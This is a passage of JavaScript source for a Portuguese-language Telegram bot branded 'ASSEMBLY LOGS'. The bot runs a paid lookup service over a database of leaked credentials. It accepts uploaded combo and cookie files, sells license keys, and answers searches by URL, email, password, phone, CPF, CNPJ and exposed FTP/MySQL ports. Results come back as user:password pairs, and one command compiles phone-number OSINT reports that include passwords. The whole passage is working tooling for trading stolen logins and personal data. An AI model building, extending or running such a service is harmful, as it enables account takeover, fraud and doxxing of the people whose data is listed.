        if (insData.inserted > 0) {
          bot.editMessageText(
            `📥 *Recebido:* \`${doc.file_name}\`\n✅ _${insData.inserted} combos inseridos no banco!_`,
            { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
          ).catch(() => {});
        }
      } catch (insErr) {
        console.error('[BOT] Upload insert error:', insErr.message);
      }

      bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
      await bot.sendMessage(chatId,
        `📋 *RESULTADO DO UPLOAD*\n\n` +
        `📁 Arquivo: \`${doc.file_name}\`\n` +
        `💾 Total inseridos: *${combos.length}* combos\n` +
        `📦 Banco: DB5`,
        opts({ parse_mode: 'Markdown' })
      );

      fs.unlink(filePath, () => {});

    } catch (err) {
      console.error('[BOT] handleFileCheck error:', err);
      if (statusMsg) bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
      bot.sendMessage(chatId, `❌ Erro no upload: ${err.message}`, opts()).catch(() => {});
    }
  }

  bot.on('message', async (msg) => {
    try {
      const text = (msg.text || '').trim();
      const chatId = msg.chat.id;
      const threadId = msg.message_thread_id;
      const username = msg.from?.username ? `@${msg.from.username}` : (msg.from?.first_name || 'Anon');
      const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
      const userId = msg.from?.id;
      const userKey = `${chatId}_${userId}`;
      const isGroup = msg.chat && (msg.chat.type === 'group' || msg.chat.type === 'supergroup');

      // ── MODO MANUTENÇÃO — bloqueia tudo exceto admin ──
      if (maintenanceMode && chatId !== ADMIN_ID) {
        return bot.sendMessage(chatId,
          `🚧 *BOT EM MANUTENÇÃO*\n\nO bot está temporariamente fora do ar para atualizações.\nTente novamente em alguns minutos.`,
          opts({ parse_mode: 'Markdown' })
        );
      }

      // ── MODO GRUPO: todos do grupo podem usar, ilimitado, 100 resultados ──
      if (isGroup) {
        // Verifica se o grupo está na lista de permissões (assemblyleak)
        if (!isAllowedGroup(chatId)) {
          // Notifica que o grupo não tem permissão e indica o link correto
          bot.sendMessage(chatId, '❌ Você não tem permissão para usar este bot neste grupo.\nEntre no @assemblyleak para ter acesso.', opts()).catch(() => {});
          return;
        }
        groupChats.add(chatId);
        if (!groupChatsLogged.has(chatId)) {
          groupChatsLogged.add(chatId);
          console.log(`[GROUP] chatId=${chatId} title="${msg.chat.title}" allowed=${isAllowedGroup(chatId) ? 'YES' : 'NO (somente admins)'} type=${msg.chat.type}`);
        }
      }

      // ── CHECKER: Auto-detecta cookie ou login ──
      if (msg.document) {
        const doc = msg.document;
        if (doc.file_name && (doc.file_name.endsWith('.txt') || doc.file_name.endsWith('.csv') || doc.file_name.endsWith('.json'))) {
          // Limite do Telegram Bot API: 20MB
          const maxSize = 20 * 1024 * 1024;
          if (doc.file_size && doc.file_size > maxSize) {
            const sizeMB = (doc.file_size / 1024 / 1024).toFixed(1);
            return bot.sendMessage(chatId, `❌ Arquivo muito grande: *${sizeMB}MB*\n\nLimite do Telegram: *20MB*\n\n💡 _Divida o arquivo em partes menores._`, opts({ parse_mode: 'Markdown' }));
          }
          const tmpPath = await bot.downloadFile(doc.file_id, TMP_DIR);
          const preview = fs.readFileSync(tmpPath, 'utf8');
          const isCookie = detectCookieFile(preview);
          if (isCookie) {
            return handleCookieCheck(chatId, doc, tmpPath, preview, threadId);
          } else {
            return handleFileCheck(chatId, doc, pool, threadId, tmpPath);
          }
        }
      }

      if (!text) return;

      // Parse comando e argumento
      const isCommand = text.startsWith('/');

      // Log otimizado (apenas para comandos)
      if (isCommand) {
        const logLine = `[${new Date().toISOString()}] ${username} (${chatId}): ${text}\n`;
        const logsPath = path.join(__dirname, 'bot_logs.txt');
        fs.appendFileSync(logsPath, logLine);
      }
      const command = isCommand ? text.split(' ')[0].toLowerCase().split('@')[0] : null;
      const args = isCommand ? text.split(' ').slice(1).join(' ').trim() : text;

      // ── Comandos ──────────────────────────────────
      if (command === '/start' || command === '/help') {
        // Marca como grupo se for
        if (isGroup) groupChats.add(chatId);
        // Remove botão "ABRIR APP" deste chat
        try {
          const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/setChatMenuButton`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, menu_button: { type: 'default' } })
          });
          const result = await resp.json();
          console.log(`✅ [BOT] Menu button resetado para ${chatId}:`, result);
        } catch (e) {
          console.log('⚠️ [BOT] Erro ao resetar menu button:', e.message);
        }

        // Busca total de registros em tempo real
        let totalRecords = 0;
        try {
          const results = await Promise.allSettled(
            pool.pools.map(p => p.query(`SELECT reltuples::bigint AS count FROM pg_class WHERE relname = 'credentials'`))
          );
          results.forEach((r) => {
            const count = r.status === 'fulfilled' ? Number(r.value.rows[0]?.count || 0) : 0;
            totalRecords += count;
          });
        } catch (e) {
          console.log('⚠️ Erro ao buscar total de registros:', e.message);
        }

        // Mostra status do usuário
        const userAccess = await checkUserAccess(chatId, groupChats.has(chatId));
        let statusLine, previewText;

        if (userAccess.status === 'premium') {
          let expiresText = '';
          if (userAccess.expiresAt) {
            const d = new Date(userAccess.expiresAt);
            expiresText = `\n⏳ Expira em: ${d.toLocaleDateString('pt-BR')}`;
          } else {
            expiresText = `\n♾️ Vitalícia`;
          }
          statusLine = `✅ *PESQUISAS PREMIUM* ${expiresText} 🎉`;
          previewText = `Você já possui acesso completo ao banco de dados.\n` +
            `Use os botões abaixo para navegar.`;
        } else if (userAccess.status === 'group') {
          statusLine = `👥 *MODO GRUPO* — Ilimitado (50 resultados/busca)`;
          previewText = `Este chat é um *grupo* com bot ativo.\n` +
            `✅ Buscas *ILIMITADAS* com até *50 resultados* por busca.`;
        } else if (userAccess.status === 'expired') {
          statusLine = `🟢 *BUSCAS ILIMITADAS*`;
          previewText = `✅ Você tem acesso a *buscas ilimitadas* com até *100 resultados*.\n` +
            `🔑 Para mais resultados por busca, compre uma key.`;
        } else {
          statusLine = `🟢 *BUSCAS ILIMITADAS*`;
          previewText = `✅ Você tem acesso a *buscas ilimitadas* com até *100 resultados*.\n` +
            `🔑 Para mais resultados por busca, compre uma key abaixo.`;
        }

        const inGroup = groupChats.has(chatId);
        const totalFormatted = totalRecords.toLocaleString('pt-BR');
        const helpText =
          `💀 𝗔𝗦𝗦𝗘𝗠𝗕𝗟𝗬 𝗟𝗢𝗚𝗦\n\n` +
          `🟢 *𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗡𝗖𝗜𝗣𝗔𝗟*\n\n` +
          `${statusLine}\n` +
          `📊 *Total records (${totalFormatted})*\n\n` +
          `${previewText}\n\n` +
          `📌 *Navegue usando os botões abaixo:*\n` +
          `🔓 /LOGIN - Acessar com credenciais\n` +
          `🛠️ /FERRAMENTAS - Ver todas as tools\n` +
          `🔎 /CONSULTARDADOS - Consultas avançadas\n\n` +
          (inGroup ? '' : `💎 *Não tem key?* ${OWNER_PROFILE}`);

        const mainMenuButtons = [
          [{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }],
          [{ text: '🚀 PUXAR LOGINS', callback_data: 'puxar_logins', style: 'primary' }],
          [{ text: '📊 PUXAR DADOS', callback_data: 'puxar_dados', style: 'primary' }],
          [{ text: '➕ ADICIONAR AO GRUPO', url: `https://t.me/${TOKEN.split(':')[0]}?startgroup=true`, style: 'primary' }]
        ];
        const markup = {
          reply_markup: {
            inline_keyboard: mainMenuButtons
          }
        };

        if (fs.existsSync(BANNER_VIDEO)) {
          await bot.sendVideo(chatId, BANNER_VIDEO, opts({ caption: helpText, parse_mode: 'Markdown', ...markup })).catch(() => {
            bot.sendMessage(chatId, helpText, opts({ parse_mode: 'Markdown', ...markup }));
          });
        } else if (fs.existsSync(BANNER_PATH)) {
          await bot.sendPhoto(chatId, BANNER_PATH, opts({ caption: helpText, parse_mode: 'Markdown', ...markup })).catch(() => {
            bot.sendMessage(chatId, helpText, opts({ parse_mode: 'Markdown', ...markup }));
          });
        } else {
          await bot.sendMessage(chatId, helpText, opts({ parse_mode: 'Markdown', ...markup }));
        }
        return;
      }

      // ── /login — Fazer login com credenciais ──
      if (command === '/login') {
        return bot.sendMessage(chatId,
          `🔓 *LOGIN COM CREDENCIAIS*\n\n` +
          `Selecione a plataforma para fazer login:\n\n` +
          `• 🚑 *Portal SISP (ES)* - Sistema de Saúde\n` +
          `• 🏛️ *Câmara Municipal*\n` +
          `• 🏢 *Prefeitura*\n\n` +
          `_Funcionalidade em desenvolvimento..._`,
          opts({
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: '🏠 VOLTAR AO MENU', callback_data: 'cmd_menu', style: 'primary' }]
              ]
            }
          })
        );
      }

      // ── /ferramentas — Mostrar ferramentas disponíveis ──
      if (command === '/ferramentas') {
        return bot.sendMessage(chatId,
          `🛠️ *FERRAMENTAS*\n\nSelecione uma opção:`,
          opts({
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔍 WHOIS', callback_data: 'srch_whois', style: 'primary' }, { text: '📍 GEOIP', callback_data: 'srch_geoip', style: 'primary' }],
                [{ text: '🏠 VOLTAR AO MENU', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
              ]
            }
          })
        );
      }

      // ── /consultardados — Alias para /consulta ──
      if (command === '/consultardados') {
        return (command = '/consulta');
      }

      // ── /key — Ativar key premium ──
      if (command === '/key') {
        if (!args || args.trim().length < 5) {
          const inGroup = groupChats.has(chatId);
          const keyMsg = inGroup
            ? `❌ *Uso Incorreto*\n\nEnvie: \`/key SUA-CHAVE\`\n\n💬 *Não tem key? Compre no privado!*`
            : `❌ *Uso Incorreto*\n\nEnvie: \`/key SUA-CHAVE\`\n\n💬 *Não tem key?* ${OWNER_PROFILE}`;
          return bot.sendMessage(chatId, keyMsg, opts({ parse_mode: 'Markdown' }));
        }
        let keyInput = args.trim().replace(/[`*_~[\]()>#+!]/g, '').toUpperCase();
        keyInput = keyInput.replace(/^(KEY|CHAVE|MINHA|CHAVE\s+KEY)\s+/i, '').trim();
        console.log(`[BOT] /key activation: ${chatId} => ${keyInput}`);
        const result = await activateKey(chatId, keyInput);
        if (result.success) {
          bot.sendMessage(chatId, result.message, opts({ parse_mode: 'Markdown' }));
        } else {
          bot.sendMessage(chatId, result.message, opts({ parse_mode: 'Markdown' }));
        }
        return;
      }

      // ── /genkey — Gerar key premium (só admin) ──
      if (command === '/genkey' || command === '/gerarkey') {
        if (chatId !== ADMIN_ID) {
          return bot.sendMessage(chatId, `❌ Apenas o dono do bot pode usar este comando.`, opts());
        }
        try {
          // /genkey 30 → 30 dias, /genkey → vitalícia
          const days = args ? parseInt(args.trim()) : null;
          const validDays = days && days > 0 ? days : null;
          const validSeconds = validDays ? validDays * 86400 : null;
          const { key: newKey } = generateKey(validSeconds);
          if (validSeconds) {
            await _writePool.query(
              `INSERT INTO license_keys (key, duration_seconds) VALUES ($1, $2)`,
              [newKey, validSeconds]
            );
          } else {
            await _writePool.query(
              `INSERT INTO license_keys (key) VALUES ($1)`,
              [newKey]
            );
          }
          const durationText = validDays ? `⏳ *Duração:* ${validDays} dias` : `♾️ *Duração:* Vitalícia`;
          await bot.sendMessage(chatId,
            `✅ *Key gerada com sucesso!*\n\n` +
            `🔑 Key: \`${newKey}\`\n` +
            `${durationText}\n\n` +
            `📋 _Copie e envie para o comprador._`,
            opts({ parse_mode: 'Markdown' })
          );
        } catch (err) {
          bot.sendMessage(chatId, `❌ Erro ao gerar key: ${err.message}`, opts());
        }
        return;
      }

      // ── /checkkey — Diagnosticar se key existe no banco (só admin) ──
      if (command === '/checkkey') {
        if (chatId !== ADMIN_ID) {
          return bot.sendMessage(chatId, `❌ Só o admin pode usar este comando.`, opts());
        }
        if (!args || args.trim().length < 5) {
          return bot.sendMessage(chatId, `❌ Uso: \`/checkkey ASLK-XXXX-XXXX-XXXX\``, opts({ parse_mode: 'Markdown' }));
        }
        try {
          const searchKey = args.trim().replace(/[`*_~[\]()>#+!]/g, '').toUpperCase().replace(/^(KEY|CHAVE|MINHA|CHAVE\s+KEY)\s+/i, '').trim();
          const result = await _writePool.query(`SELECT id, user_id, telegram_id, activated_at, expires_at FROM license_keys WHERE key = $1 LIMIT 1`, [searchKey]);
          if (result.rows.length === 0) {
            return bot.sendMessage(chatId, `❌ Key \`${searchKey}\` **NÃO ENCONTRADA** no banco.\n\nPossíveis causas:\n• Nunca foi gerada (use /genkey)\n• O banco foi resetado\n• Está em outro pool`, opts({ parse_mode: 'Markdown' }));
          }
          const row = result.rows[0];
          let status = row.user_id || row.telegram_id ? '✅ Ativada' : '🆓 Disponível';
          let ativadaPor = '';
          if (row.user_id) ativadaPor += ` user_id=${row.user_id}`;
          if (row.telegram_id) ativadaPor += ` telegram_id=${row.telegram_id}`;
          let expira = row.expires_at ? ` Expira: ${new Date(row.expires_at).toLocaleString('pt-BR')}` : '♾️ Vitalícia';
          return bot.sendMessage(chatId, `🔍 *Diagnóstico da Key*\n\nKey: \`${searchKey}\`\nStatus: ${status}${ativadaPor}\n${expira}\nAtivada em: ${row.activated_at ? new Date(row.activated_at).toLocaleString('pt-BR') : 'Nunca'}`, opts({ parse_mode: 'Markdown' }));
        } catch (err) {
          bot.sendMessage(chatId, `❌ Erro: ${err.message}`, opts());
        }
        return;
      }

      // ── /manutencao — Ativar/desativar manutenção (só admin) ──
      if (command === '/manutencao' || command === '/manutenção') {
        if (chatId !== ADMIN_ID) {
          return bot.sendMessage(chatId, `❌ Apenas o admin pode usar este comando.`, opts());
        }
        maintenanceMode = !maintenanceMode;
        const status = maintenanceMode ? '🔴 ATIVADA' : '🟢 DESATIVADA';
        const emoji = maintenanceMode ? '🚧' : '✅';
        await bot.sendMessage(chatId,
          `${emoji} *Manutenção ${status}*\n\n` +
          (maintenanceMode
            ? `O site e o bot estão em manutenção.\nNovos usuários verão aviso de manutenção.\n\nUse \`/manutencao\` novamente para desativar.`
            : `O site e o bot voltaram ao normal.`),
          opts({ parse_mode: 'Markdown' })
        );
        return;
      }

      // ── /aviso — Enviar aviso global para todos os usuários (só admin) ──
      if (command === '/aviso' || command === '/avisoglobal') {
        if (chatId !== ADMIN_ID) {
          return bot.sendMessage(chatId, `❌ Apenas o admin pode usar este comando.`, opts());
        }
        if (!args || args.trim().length < 3) {
          return bot.sendMessage(chatId,
            `❌ *Uso:* \`/aviso <mensagem>\`\n\n*Exemplo:*\n\`/aviso O bot será atualizado às 22h\``,
            opts({ parse_mode: 'Markdown' })
          );
        }
        const announcement = args.trim();
        // Busca todos os chat_ids conhecidos
        const allUsers = await _writePool.query(
          `SELECT DISTINCT telegram_id FROM bot_trials UNION SELECT DISTINCT telegram_id FROM license_keys WHERE telegram_id IS NOT NULL`
        );
        const chatIds = allUsers.rows.map(r => r.telegram_id);
        // Adiciona o próprio admin
        if (!chatIds.includes(ADMIN_ID)) chatIds.push(ADMIN_ID);

        let sent = 0, failed = 0;
        for (const uid of chatIds) {
          try {
            await bot.sendMessage(uid,
              `${announcement}`,
              opts({ parse_mode: 'Markdown' })
            );
            sent++;
          } catch { failed++; }
        }
        await bot.sendMessage(chatId,
          `✅ *Aviso enviado!*\n\n` +
          `📤 Enviado: *${sent}*\n` +
          (failed > 0 ? `❌ Falhou: *${failed}*` : ''),
          opts({ parse_mode: 'Markdown' })
        );
        return;
      }

      // ── /comprar ou /planos — Mostra planos de pagamento ──
      if (command === '/comprar' || command === '/planos' || command === '/pagar') {
        if (!stripe) {
          const inGroup = groupChats.has(chatId);
          const paymentMsg = inGroup
            ? `❌ Pagamentos indisponíveis no momento.`
            : `❌ Pagamentos indisponíveis no momento. Contate: ${OWNER_PROFILE}`;
          return bot.sendMessage(chatId, paymentMsg, opts({ parse_mode: 'Markdown' }));
        }
        const planButtons = PLANS.map((p, i) =>
          [{ text: `${p.emoji} ${p.label} — R$${(p.priceCents / 100).toFixed(0)}`, callback_data: `plan_${i}`, style: 'primary' }]
        );
        return bot.sendMessage(chatId,
          `💳 *ESCOLHA SEU PLANO*\n\n` +
          `Selecione abaixo o plano desejado para comprar sua key:\n\n` +
          PLANS.map((p, i) => `${i+1}. ${p.emoji} *${p.label}* — R$${(p.priceCents / 100).toFixed(0)}`).join('\n') +
          `\n\n💳 *Aceitamos:* Cartão de Crédito e Boleto`,
          opts({
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [...planButtons] }
          })
        );
      }

      // ── Verificação de acesso para comandos de busca ──
      const searchCmds = new Set(['/url', '/pesquisar', '/search', '/email', '/user', '/usuario', '/username', '/ip', '/inurl', '/senha', '/pass', '/password', '/telefone', '/tel', '/phone', '/inmail', '/cpf', '/cnpj', '/checkdomain', '/domain', '/ftp', '/smtp', '/mysql', '/port8080', '/port8443', '/whois', '/geoip', '/copyurl', '/subdominios']);
      if (searchCmds.has(command)) {
        const access = await checkUserAccess(chatId, await isGroupOwner(msg));
        if (access.status === 'expired') {
          const inGroup = groupChats.has(chatId);
          const resetText = access.resetIn ? `\n⏱️ Libera em: *${access.resetIn}*` : '';
          const expiredMsg = inGroup
            ? `🚫 *Teste Esgotado*\n\nVocê usou suas *${TRIAL_MAX_SEARCHES} pesquisas* gratuitas.${resetText}\n\nCompre uma key para continuar.`
            : `🚫 *Teste Esgotado*\n\nVocê usou suas *${TRIAL_MAX_SEARCHES} pesquisas* gratuitas.${resetText}\n\n*Compre uma key ou me contate:* ${OWNER_PROFILE}`;
          const replyMarkup = inGroup
            ? { inline_keyboard: [[{ text: '💰 COMPRAR KEY', callback_data: 'show_plans', style: 'primary' }]] }
            : { inline_keyboard: [
                [{ text: '💰 COMPRAR KEY', callback_data: 'show_plans', style: 'primary' }],
                [{ text: '💬 SUPORTE', url: OWNER_PROFILE }]
              ] };
          return bot.sendMessage(chatId, expiredMsg, opts({
            parse_mode: 'Markdown',
            reply_markup: replyMarkup
          }));
        }
        if (access.status !== 'premium' && access.status !== 'group') {
          await registerTrial(chatId);
          await incrementTrialSearch(chatId);
        }
      }

      if (command === '/url' || command === '/pesquisar' || command === '/search') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'url');
          return bot.sendMessage(chatId, `🔗 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗨𝗥𝗟\n\nEnvie a *URL* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        const queryId = Date.now().toString(36) + Math.random().toString(36).substring(2, 5);
        queryStore.set(queryId, { query: args.trim(), field: 'url', threadId });
        // Limpa store se ficar muito grande
        if (queryStore.size > 1000) {
          const firstKey = queryStore.keys().next().value;
          queryStore.delete(firstKey);
        }
        return bot.sendMessage(chatId, `🔍 *Busca:* \`${args.trim()}\`\n\nEscolha o formato de saída:`, opts({
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '📋 USER:PASS (PREMIUM)', callback_data: `chk_${queryId}` },
                { text: '📋 URL:USER:PASS (PREMIUM)', callback_data: `chk2_${queryId}` },
                { text: '📄 FULL', callback_data: `full_${queryId}` },
                { text: '🌐 SUB', callback_data: `sub_${queryId}` }
              ],
              [{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
            ]
          }
        }));
      }

      if (command === '/email') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'email');
          return bot.sendMessage(chatId, `✉️ 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗘-𝗺𝗮𝗶𝗹\n\nEnvie o *E-mail* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendResults(chatId, 'email', args, pool, threadId);
      }

      if (command === '/total' || command === '/db') {
        if (chatId !== ADMIN_ID) {
          return bot.sendMessage(chatId, `❌ Comando restrito.`, opts());
        }
        try {
          const results = await Promise.allSettled(
            pool.pools.map(p => p.query(`SELECT reltuples::bigint AS count, current_setting('server_version') AS ver FROM pg_class WHERE relname = 'credentials'`))
          );
          let total = 0;
          let dbLines = '';
          results.forEach((r, i) => {
            const count = r.status === 'fulfilled' ? Number(r.value.rows[0]?.count || 0) : 0;
            total += count;
            dbLines += `• *DB${i+1}:* \`${count.toLocaleString('pt-BR')}\` registros\n`;
          });
          const formatted = total.toLocaleString('pt-BR');
          await bot.sendMessage(
            chatId,
            `📊 *ESTADO DA BASE*\n\n${dbLines}• *Total:* \`${formatted}\`\n• *Status:* \`ONLINE\` 🟢`,
            opts({ parse_mode: 'Markdown' })
          );
        } catch (e) {
          bot.sendMessage(chatId, `❌ Erro: ${e.message}`, opts());
        }
        return;
      }



      // /user — busca username dentro do campo email (parte antes do @)
      if (command === '/user' || command === '/usuario' || command === '/username') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'user');
          return bot.sendMessage(chatId, `👤 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗨𝘀𝘂𝗮́𝗿𝗶𝗼\n\nEnvie o *Usuário* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendUserResults(chatId, args, pool, threadId);
      }

      // /ip — busca por endereço IP na URL
      if (command === '/ip') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'ip');
          return bot.sendMessage(chatId, `📍 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗜𝗣\n\nEnvie o *IP* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendIpResults(chatId, args, pool, threadId);
      }

      // /inurl — busca URLs que contenham o padrão (ex: wp-admin, login, admin)
      if (command === '/inurl') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'INURL');
          return bot.sendMessage(chatId, `🔗 𝗕𝘂𝘀𝗰𝗮𝗿 𝗜𝗻𝗨𝗿𝗹\n\nEnvie o *termo* que deve conter na URL:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendInurlResults(chatId, args, pool, threadId);
      }

      if (command === '/senha' || command === '/pass' || command === '/password') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'SENHA');
          return bot.sendMessage(chatId, `🔒 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗦𝗲𝗻𝗵𝗮\n\nEnvie a *Senha* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendResults(chatId, 'SENHA', args, pool, threadId);
      }

      if (command === '/telefone' || command === '/tel' || command === '/phone') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'TELEFONE');
          return bot.sendMessage(chatId, `📞 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗧𝗲𝗹𝗲𝗳𝗼𝗻𝗲\n\nEnvie o *Telefone* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendResults(chatId, 'TELEFONE', args, pool, threadId);
      }

      // /inmail — busca por provedor de email
      if (command === '/inmail') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'INMAIL');
          return bot.sendMessage(chatId, `📨 𝗕𝘂𝘀𝗰𝗮𝗿 𝗜𝗻𝗠𝗮𝗶𝗹\n\nEnvie o *provedor de e-mail*:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendInmailResults(chatId, args, pool, threadId);
      }

      // /cpf — busca por CPF
      if (command === '/cpf') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'cpf');
          return bot.sendMessage(chatId, `📋 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗖𝗣𝗙\n\nEnvie o *CPF* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendCpfResults(chatId, args, pool, threadId);
      }

      // /cnpj — busca por CNPJ
      if (command === '/cnpj') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'cnpj');
          return bot.sendMessage(chatId, `🏢 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗖𝗡𝗣𝗝\n\nEnvie o *CNPJ* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendCnpjResults(chatId, args, pool, threadId);
      }

      // /checkdomain — resumo completo de um domínio
      if (command === '/checkdomain' || command === '/domain') {
        if (!args || args.trim().length < 2) {
          pendingSearch.set(userKey, 'domain');
          return bot.sendMessage(chatId, `🌍 𝗕𝘂𝘀𝗰𝗮𝗿 𝗽𝗼𝗿 𝗗𝗼𝗺𝗶́𝗻𝗶𝗼\n\nEnvie o *Domínio* que deseja buscar:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendCheckDomainResults(chatId, args, pool, threadId);
      }

      // Atalhos de porta/protocolo — delegam para /inurl
      if (command === '/ftp') {
        return sendInurlResults(chatId, args || 'ftp://', pool, threadId);
      }
      if (command === '/smtp') {
        return sendInurlResults(chatId, args || 'smtp', pool, threadId);
      }
      if (command === '/mysql') {
        return sendInurlResults(chatId, args || ':3306', pool, threadId);
      }
      if (command === '/port8080') {
        return sendInurlResults(chatId, args || ':8080', pool, threadId);
      }
      if (command === '/port8443') {
        return sendInurlResults(chatId, args || ':8443', pool, threadId);
      }

      if (false) { // Removido duplicado
        if (chatId.toString() !== process.env.ADMIN_ID && chatId !== 2135466806) {
          return bot.sendMessage(chatId, `❌ Comando restrito.`, opts());
        }
        try {
          const results = await Promise.allSettled(
            pool.pools.map(p => p.query(`SELECT reltuples::bigint AS count FROM pg_class WHERE relname = 'credentials'`))
          );
          let total = 0;
          results.forEach((r, i) => {
            const count = r.status === 'fulfilled' ? Number(r.value.rows[0]?.count || 0) : 0;
            total += count;
          });
          const formatted = total.toLocaleString('pt-BR');
          await bot.sendMessage(
            chatId,
            `📊 *TOTAL:* \`${formatted}\``,
            opts({ parse_mode: 'Markdown' })
          );
        } catch (e) {
          bot.sendMessage(chatId, `❌ Erro: ${e.message}`, opts());
        }
        return;
      }
      // /subdominios — busca logins por subdomínios
      if (command === '/subdominios') {
        if (!args || args.trim().length < 3) {
          pendingSearch.set(userKey, 'subdominios');
          return bot.sendMessage(chatId, `🌐 𝗕𝘂𝘀𝗰𝗮𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗶́𝗻𝗶𝗼𝘀\n\nEnvie o *Domínio* para buscar subdomínios:`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        return sendSubdomainResults(chatId, args.trim(), pool, threadId);
      }
      // /whois — OSINT de telefone
      if (command === '/whois') {
        if (!args || args.trim().length < 7) {
          pendingSearch.set(userKey, 'WHOIS');
          return bot.sendMessage(chatId, `🔍 𝗕𝘂𝘀𝗰𝗮𝗿 𝗪𝗵𝗼𝗶𝘀\n\nEnvie o *Telefone* para consultar (ex: +5511999999999):`, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
        }
        const phone = args.trim().replace(/[\s\-\(\)]/g, '');
        bot.sendChatAction(chatId, 'typing', opts()).catch(() => {});

        try {
          // Busca todos os registros com esse telefone
          const res = await pool.query(
            `SELECT url, email, senha, telefone, fonte FROM credentials WHERE telefone ILIKE $1 LIMIT 500`,
            [`%${phone}%`]
          );

          if (res.rows.length === 0) {
            return bot.sendMessage(chatId, `❌ Nenhum resultado para \`${phone}\``, opts({ parse_mode: 'Markdown', reply_markup: noResultBtn }));
          }

          const rows = res.rows;
          const emails = [...new Set(rows.map(r => r.email).filter(Boolean))];
          const sites = [...new Set(rows.map(r => {
            try {
              const u = r.url?.toLowerCase() || '';
              if (u.startsWith('http')) {
                const after = u.indexOf('://') + 3;
                const end = u.indexOf('/', after);
                return end === -1 ? u.substring(after) : u.substring(after, end);
              }
              return u.split('/')[0];
            } catch(e) { return ''; }
          }).filter(Boolean))];
          const senhas = [...new Set(rows.map(r => r.senha).filter(Boolean))];
          const fontes = [...new Set(rows.map(r => r.fonte).filter(Boolean))];

          let report = `🕵️ *WHOIS — Relatório OSINT*\n\n`;
          report += `📱 *Telefone:* \`${phone}\`\n`;
          report += `📊 *Registros encontrados:* ${rows.length}\n\n`;

          report += `📧 *Emails vinculados (${emails.length}):*\n`;
          emails.slice(0, 20).forEach(e => { report += `• \`${e}\`\n`; });
          if (emails.length > 20) report += `_...e mais ${emails.length - 20}_\n`;

          report += `\n🌐 *Sites (${sites.length}):*\n`;
          sites.slice(0, 15).forEach(s => { report += `• \`${s}\`\n`; });
          if (sites.length > 15) report += `_...e mais ${sites.length - 15}_\n`;

